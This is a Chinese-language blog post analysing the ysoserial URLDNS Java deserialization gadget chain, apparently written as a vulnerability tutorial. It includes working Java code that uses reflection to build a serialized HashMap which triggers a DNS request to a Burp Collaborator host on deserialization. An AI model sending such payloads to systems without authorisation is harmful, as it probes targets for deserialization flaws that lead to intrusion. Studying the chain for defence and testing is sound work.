---
title: JAVA安全:URLDNS链
---

*作者：Narcher*	*时间：2024/3/16*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

URLDNS链是ysoserial中的一条非常经典的链，由于其与jdk版本无关，使用的均为java内置类，常常被用于检测目标是否存在反序列化漏洞，这条链本身是没有什么危害的，仅能发起DNS请求。



## 正文

我们先去ysoserial中看一下这条链的完整流程：

![1710588514830](JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588514830.png)

可以看见这条链的流程非常简单，我们就倒着来分析一遍。

### 1.URL.hashCode()部分

为什么要利用URL.hashCode()呢？我们进去看一下：

```java
public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
```

可以发现它的hashCode()方法里边调用了URLStreamHandler的hashCode()方法，而URLStreamHandler的hashCode()方法则如下图所示：

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588856154.png" alt="1710588856154" style="zoom:50%;" />

可见其将URL传入后调用了getHostAddress()方法，而getHostAddress()方法则会发送DNS请求去查询URL的主机名，如下图所示：

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710588938529.png" alt="1710588938529" style="zoom:50%;" />

既然如此，我们从终点往上回溯，去看看HashMap如何调用的hashCode()方法。

### 2.HashMap.hash()部分

它这个HashMap很有意思，里边呢接收两个随意的值，一个当KEY，一个当VALUE。我们要找HashMap里调用hashCode()方法的地方，如下：

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589249117.png" alt="1710589249117" style="zoom: 67%;" />

之后我们再往上找利用HashMap中hash()方法的地方。

### 3.HashMap.putVal()部分

我们可以看到HashMap自身的put()方法中有putVal()方法对hash()方法进行了调用，而该方法则是在readObject()中也有调用：

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589324316.png" alt="1710589324316" style="zoom: 67%;" />

### 4.HashMap.readObject()部分

因为我们在反序列化的时候会触发readObject()方法，而HashMap则对readObject()方法进行了重写，因此我们可以直接将HashMap进行序列化，然后反序列化触发上述URLDNS链。

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710590232141.png" alt="1710590232141" style="zoom:50%;" />

### 5.构造链

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589616180.png" alt="1710589616180" style="zoom:67%;" />

仅按上述描述来看的话，我们就能够利用上图中的链进行触发了。但实际上，通过调试可以发现，此时触发这条链的并非反序列化，而是序列化之前的：

```java
hashMap.put(new URL("http://d1fq6zzx9q24dt8yandyaqt5awgm4b.burpcollaborator.net"),1);
```

这个就很有意思了，因为put()方法会直接调用hash()方法，导致这条链正向执行一遍，那么我们在反序列化的时候是否还会触发呢？

答案是NONONO~~~~

因为从URL.hashCode()方法中我们可以看到，其私有属性hashCode仅在值为-1的时候会进行执行URLStreamHandler的hashCode()方法，而在正向触发过一次之后，hashCode已经被赋值为其他值了，不能再次触发。那么我们有什么办法使其值在运行过程中改变呢？答案是反射。

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710589823250.png" alt="1710589823250" style="zoom:67%;" />

#### 反射的引用

我们想要这条链在序列化的时候不被触发，而在反序列化的时候触发。那么我们就利用反射，将其在序列化之前，也就是put的时候hashCode赋值为其他，而在序列化前赋值为-1，使其反序列化正好触发。

链子如下：

```java
HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
URL url = new URL("http://7ltkbk2jj0pgndcc33oyxbsy1p7fv4.burpcollaborator.net");
Class c = url.getClass();
Field hashcode = c.getDeclaredField("hashCode");
hashcode.setAccessible(true);//针对私有方法必备
hashcode.set(url,1);
hashMap.put(url,1);
hashcode.set(url,-1);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\URLDNS.txt"));
oos.writeObject(hashMap);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\URLDNS.txt"));
ois.readObject();
```

之后我们便可看到正常的DNS请求了：

<img src="JAVA%E5%AE%89%E5%85%A8URLDNS%E9%93%BE/1710590638330.png" alt="1710590638330" style="zoom:50%;" />